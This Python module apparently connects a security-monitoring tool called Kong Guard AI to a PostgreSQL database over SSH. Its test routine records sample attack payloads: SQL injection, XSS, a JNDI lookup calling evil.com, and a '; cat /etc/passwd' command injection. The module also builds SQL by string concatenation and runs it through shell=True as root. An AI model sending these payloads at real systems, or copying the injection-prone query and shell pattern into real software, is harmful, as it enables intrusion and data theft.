#!/usr/bin/env python3
"""
Kong Guard AI - Production Supabase Interface
Ready for integration with Kong Guard AI system
"""

import subprocess
import logging
from datetime import datetime
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)

class SupabaseProduction:
    """Production-ready Supabase interface for Kong Guard AI"""
    
    def __init__(self, host: str = "192.168.0.201", container: str = "122"):
        self.host = host
        self.container = container
        self.user = "supabase_admin"
        self.database = "postgres"
        self.schema = "kongguard"
    
    def _escape_sql_string(self, value: str) -> str:
        """Escape string for SQL within shell quotes"""
        # Replace single quotes with doubled single quotes for PostgreSQL
        # Also escape shell-sensitive characters
        return value.replace("'", "''").replace('"', '""').replace('\\', '\\\\').replace('$', '\\$')
    
    def execute_query(self, query: str) -> Dict[str, Any]:
        """Execute SQL query via SSH with proper escaping"""
        try:
            # Use heredoc to avoid shell escaping issues
            cmd = f"""ssh root@{self.host} 'pct exec {self.container} -- docker exec -i supabase-db psql -U {self.user} -d {self.database}' << 'EOF'
SET search_path TO {self.schema}, public;
{query}
EOF"""
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr
            }
            
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}
    
    def create_attack_run(self, intensity: str, strategy: str, duration: int = 60, config: Dict = None) -> Optional[int]:
        """Create a new attack run and return run_id"""
        intensity = self._escape_sql_string(intensity)
        strategy = self._escape_sql_string(strategy)
        
        query = f"INSERT INTO attack_runs (intensity_level, strategy, duration) VALUES ('{intensity}', '{strategy}', {duration}) RETURNING run_id;"
        
        result = self.execute_query(query)
        
        if result["success"]:
            # Parse run_id from output
            lines = result["output"].strip().split('\n')
            for line in lines:
                stripped = line.strip()
                if stripped.isdigit():
                    run_id = int(stripped)
                    logger.info(f"Created attack run {run_id}")
                    return run_id
        
        logger.error(f"Failed to create attack run: {result.get('error', 'Unknown error')}")
        return None
    
    def insert_attack_metric(self, run_id: int, tier: str, attack_type: str, 
                           attack_category: str = None, payload: str = None,
                           response_time_ms: float = None, threat_score: float = None,
                           confidence: float = None, action_taken: str = None,
                           blocked: bool = False, status_code: int = None,
                           source_ip: str = None, user_agent: str = None,
                           error_message: str = None) -> bool:
        """Insert a detailed attack metric"""
        
        # Build the VALUES clause dynamically
        columns = ['run_id', 'timestamp']
        values = [str(run_id), f"'{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}'"]
        
        if tier:
            columns.append('tier')
            values.append(f"'{self._escape_sql_string(tier)}'")
        
        if attack_type:
            columns.append('attack_type')
            values.append(f"'{self._escape_sql_string(attack_type)}'")
        
        if attack_category:
            columns.append('attack_category')
            values.append(f"'{self._escape_sql_string(attack_category)}'")
        
        if payload:
            columns.append('payload')
            values.append(f"'{self._escape_sql_string(payload[:1000])}'")  # Limit payload length
        
        if response_time_ms is not None:
            columns.append('response_time_ms')
            values.append(str(response_time_ms))
        
        if threat_score is not None:
            columns.append('threat_score')
            values.append(str(threat_score))
        
        if confidence is not None:
            columns.append('confidence')
            values.append(str(confidence))
        
        if action_taken:
            columns.append('action_taken')
            values.append(f"'{self._escape_sql_string(action_taken)}'")
        
        columns.append('blocked')
        values.append('true' if blocked else 'false')
        
        if status_code is not None:
            columns.append('status_code')
            values.append(str(status_code))
        
        if source_ip:
            columns.append('source_ip')
            values.append(f"'{self._escape_sql_string(source_ip)}'")
        
        if user_agent:
            columns.append('user_agent')
            values.append(f"'{self._escape_sql_string(user_agent[:500])}'")  # Limit user agent length
        
        if error_message:
            columns.append('error_message')
            values.append(f"'{self._escape_sql_string(error_message[:500])}'")  # Limit error length
        
        query = f"INSERT INTO attack_metrics ({', '.join(columns)}) VALUES ({', '.join(values)});"
        
        result = self.execute_query(query)
        
        if result["success"]:
            logger.debug(f"Inserted attack metric: {tier} - {attack_type}")
            return True
        else:
            logger.error(f"Failed to insert metric: {result.get('error', 'Unknown error')}")
            return False
    
    def complete_attack_run(self, run_id: int, total_attacks: int = 0) -> bool:
        """Mark an attack run as complete"""
        query = f"UPDATE attack_runs SET end_time = NOW(), total_attacks = {total_attacks}, updated_at = NOW() WHERE run_id = {run_id};"
        
        result = self.execute_query(query)
        
        if result["success"]:
            logger.info(f"Completed attack run {run_id} with {total_attacks} attacks")
            return True
        else:
            logger.error(f"Failed to complete attack run: {result.get('error', 'Unknown error')}")
            return False
    
    def get_attack_run_stats(self, run_id: Optional[int] = None) -> Dict[str, Any]:
        """Get attack run statistics"""
        where_clause = f"WHERE ar.run_id = {run_id}" if run_id else ""
        limit_clause = "LIMIT 10" if not run_id else ""
        
        query = f"""
        SELECT 
            ar.run_id,
            ar.intensity_level,
            ar.strategy,
            ar.start_time,
            ar.end_time,
            ar.duration,
            ar.total_attacks,
            COUNT(am.id) as metrics_recorded,
            COUNT(CASE WHEN am.blocked = true THEN 1 END) as blocked_count,
            ROUND(AVG(am.response_time_ms), 2) as avg_response_time,
            ROUND(AVG(am.threat_score), 3) as avg_threat_score,
            ROUND(AVG(am.confidence), 3) as avg_confidence
        FROM attack_runs ar
        LEFT JOIN attack_metrics am ON ar.run_id = am.run_id
        {where_clause}
        GROUP BY ar.run_id, ar.intensity_level, ar.strategy, ar.start_time, ar.end_time, ar.duration, ar.total_attacks
        ORDER BY ar.start_time DESC
        {limit_clause};
        """
        
        result = self.execute_query(query)
        return result
    
    def test_connection(self) -> bool:
        """Test connection to Supabase"""
        result = self.execute_query("SELECT current_database(), current_user, NOW();")
        return result["success"]

def main():
    """Production test of Supabase interface"""
    print("🚀 Kong Guard AI - Production Supabase Interface Test")
    print("=" * 65)
    
    # Initialize interface
    supabase = SupabaseProduction()
    
    # Test connection
    print("🔍 Testing connection...")
    if not supabase.test_connection():
        print("❌ Connection failed")
        return False
    
    print("✅ Connection successful!")
    
    # Create production attack run
    print("\n📊 Creating production attack run...")
    run_id = supabase.create_attack_run(
        intensity="high",
        strategy="production_demo", 
        duration=300
    )
    
    if not run_id:
        print("❌ Cannot continue without run_id")
        return False
    
    print(f"✅ Created attack run: {run_id}")
    
    # Insert comprehensive test metrics
    print(f"\n📈 Inserting comprehensive attack metrics...")
    
    test_attacks = [
        {
            "tier": "tier1",
            "attack_type": "sql_injection",
            "attack_category": "Database Attack",
            "payload": "1' OR '1'='1",
            "response_time_ms": 45.8,
            "threat_score": 0.95,
            "confidence": 0.98,
            "action_taken": "block",
            "blocked": True,
            "status_code": 403,
            "source_ip": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        },
        {
            "tier": "tier2",
            "attack_type": "xss_attack",
            "attack_category": "Web Attack",
            "payload": "<script>alert('XSS')</script>",
            "response_time_ms": 67.2,
            "threat_score": 0.87,
            "confidence": 0.92,
            "action_taken": "sanitize",
            "blocked": True,
            "status_code": 200,
            "source_ip": "10.0.0.50",
            "user_agent": "AttackBot/1.0"
        },
        {
            "tier": "cloud",
            "attack_type": "zero_day_exploit",
            "attack_category": "Advanced Persistent Threat",
            "payload": "${jndi:ldap://evil.com:1389/Exploit}",
            "response_time_ms": 123.7,
            "threat_score": 1.0,
            "confidence": 1.0,
            "action_taken": "block",
            "blocked": True,
            "status_code": 403,
            "source_ip": "203.0.113.42",
            "user_agent": "curl/7.68.0"
        },
        {
            "tier": "unprotected",
            "attack_type": "command_injection",
            "attack_category": "System Attack",
            "payload": "; cat /etc/passwd",
            "response_time_ms": 189.4,
            "threat_score": 0.0,
            "confidence": 0.0,
            "action_taken": "error",
            "blocked": False,
            "status_code": 500,
            "source_ip": "172.16.0.25",
            "user_agent": "python-requests/2.28.0",
            "error_message": "Command execution failed"
        }
    ]
    
    successful_inserts = 0
    for attack in test_attacks:
        if supabase.insert_attack_metric(run_id, **attack):
            successful_inserts += 1
    
    print(f"✅ Inserted {successful_inserts}/{len(test_attacks)} attack metrics")
    
    # Complete the attack run
    print(f"\n🏁 Completing attack run...")
    if supabase.complete_attack_run(run_id, total_attacks=successful_inserts):
        print(f"✅ Attack run {run_id} marked as complete")
    
    # Get comprehensive statistics
    print(f"\n📊 Getting comprehensive statistics...")
    stats = supabase.get_attack_run_stats()
    
    if stats["success"]:
        print("✅ Attack run statistics:")
        print(stats["output"])
    else:
        print(f"❌ Failed to get stats: {stats['error']}")
    
    print("\n" + "=" * 65)
    print("🎉 Production Supabase interface is fully operational!")
    print("💾 Kong Guard AI successfully integrated with PostgreSQL")
    print("🚀 Ready for high-performance, scalable attack monitoring")
    print("📊 Real-time analytics and dashboards enabled")
    
    return True

if __name__ == "__main__":
    success = main()
    if not success:
        exit(1)